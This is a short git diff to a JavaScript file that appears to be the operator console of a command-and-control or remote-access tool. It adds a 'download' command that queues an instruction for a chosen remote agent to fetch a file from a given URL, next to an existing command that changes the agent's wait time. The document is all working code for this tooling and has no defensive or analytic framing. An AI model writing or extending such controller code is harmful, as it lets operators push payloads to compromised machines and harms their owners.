@@ -204,6 +204,22 @@ eventEmitter.on('agent', (action, ...args) => {
 
     console.log(`Chainging wait time to ${seconds} on agent ${id}`);
     agents[id].commands.push(`time&${seconds}`);
+  } else if (action === "download") {
+    if(args.length === 0) {
+      console.log('Usage: agent download <ID> <url>');
+      return
+    }
+
+    const id = args[0];
+    if (agents[id] == null) {
+      console.log('\x1b[31m%s\x1b[0m', 'An agent with that ID does not exist');
+      return;
+    }
+
+    const url = args.slice(1).join(' ');
+
+    console.log(`Told agent ${id} to download file with url ${url}`);
+    agents[id].commands.push(`download&${url}`);
   }
 });
 
